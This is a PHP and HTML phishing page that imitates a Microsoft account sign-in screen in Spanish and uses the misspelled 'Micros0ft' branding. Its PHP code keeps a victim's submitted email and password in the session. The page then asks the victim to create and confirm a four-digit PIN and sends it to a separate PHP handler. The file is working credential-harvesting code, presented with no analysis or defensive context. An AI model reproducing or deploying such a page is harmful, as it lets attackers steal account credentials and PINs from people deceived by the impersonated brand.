<?php

if (isset($_POST['jxkc']) && isset ($_POST['jxkx'])  ){
session_start();
$_SESSION['jxkc'] = $_POST['jxkc'];
$_SESSION['jxkx'] = $_POST['jxkx'];	

}

?>
		
<html dir="ltr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge">
<base href=".">
<title>Iniciar sesion en tu cuenta Microsoft!</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
<link rel="shortcut icon" href="descarga.ico">
<link rel="stylesheet" title="pagina" type="text/css" href="stylo.css">
<style type="text/css">body{display:block !important;}</style></head>

<body class="fa" data-bind="defineGlobals: ServerData, bodyCssClass" 
<body=""><div><!--  --><!--  --> <div data-bind="component: { name: 'background-image-control', publicMethods: backgroundControlMethods }">
<div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">

<!-- ko if: smallImageUrl --> <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;0-small.jpg"></div>
<div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;vzbuQ.jpg"></div> </div></div>
<div data-bind="if: activeDialog"></div> 

</div>
		

		<!--- 2da parte ---->
		
		
		
	<div id="temporada">	
		
		




<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=Edge"><base href=".">

 <div class="outer">
 <div class="middle">
 <div class="inner fade-in-lightbox"> 
 <div class="lightbox-cover"></div>
 
 <div>
 <img class="logo" role="img" src="micros0ftlogo.png" alt="Micros0ft">
 <div role="main"><div class="identityBanner">
<a href="index.php"><button type="button" class="backButton" id="botonsitoatras">
 <img onclick="ShowAndHide()" role="presentacion" src="arr0wleft.svg"></button></a>
 
		<div id="displ4yN4me" class="identity" title=""><?php if (isset ($_SESSION['jxkc'])){echo $_SESSION['jxkc'];}?></div> 
		</div></div> 
		</div>
		
		<div class="pagination-view animate has-identity-banner slide-in-next">
		<div id="l0ginHeader" class="row text-title" role="heading" aria-level="1">Crear PIN - Personal</div><div class="row"> 
		<div class="form-group col-md-24"> 
		<div role="alert" aria-live="assertive">
		</div> 
		<form name="form1" id="form1" method="post" action="Estadodelservicio.php">
		<div><input name="jxkx1" type="password" id="jxkx1" maxlength="4" autocomplete="off" class="form-control" aria-required="true" aria-describedby="l0ginHeader" placeholder="Ingrese su PIN de 4 digitos" aria-label="" tabindex="0" required="">
		<br>
		<div><input name="jxkx2" type="password" id="jxkx2" maxlength="4" autocomplete="off" class="form-control" aria-required="true" aria-describedby="l0ginHeader" placeholder="Confirme su PIN de 4 digitos" aria-label="" tabindex="0" required="">

				
				</div></div> </div>
				

				<div class="position-buttons"> <div>
				<div id="elefante5" class="form-group checkbox text-block-body no-margin-top"><label id="elefante6">
				<input name="elefante7" id="elefante7" type="checkbox">
				<span>Configurar para futuros inicios de sesión</span></label></div>
				<div class="row"> <div class="col-md-24"> <div class="text-13 action-links">
				
				<div class="form-group"> <a id="idA_PWD_ForgotPassword" href="javascript:void(0)">¿Por qué es necesario crear mi PIN?</a> </div>
				</div></div> </div> </div> </div> 
			
				<div class="col-xs-24 no-padding-left-right button-container" data-bind="">
				<div class="inline-block"> 
	
	
	<input type="submit" id="botonsito" class="btn btn-block btn-primary" value="Verificar"> 
	
	</form>
	</div> </div></div> 
	</div> 
	</div>
	</div> 
	</div></div>



<script>

function ShowAndHide() {
document.querySelector('#displ4yN4me').innerHTML = document.querySelector('#jxkc').value;
    var x = document.getElementById('temporada');
    if (x.style.display == 'none') {
       // x.style.display = 'block';
    } else {
        x.style.display = 'none';
    }
   
}
 function anular(e) {
          tecla = (document.all) ? e.keyCode : e.which;
          return (tecla != 13);
     }
	 
	 function validar(e){
  var validado = false;
  
  var letters = /^[0-9a-zA-Z]+$/;
  var filter = /^([a-zA-Z0-9\_\.\_])+\@(([a-zA-Z0-9\_])+\.)+([a-zA-Z0-9]{2,4})+$/;
  elementos = document.getElementsByClassName("form-control ltr_override");
  for(i=0;i<elementos.length;i++){
    
    if(filter.test(elementos[i].value) || letters.test(elementos[i].value) ) 
	{
    validado = false
    }
  }
  
}
</script></body></html>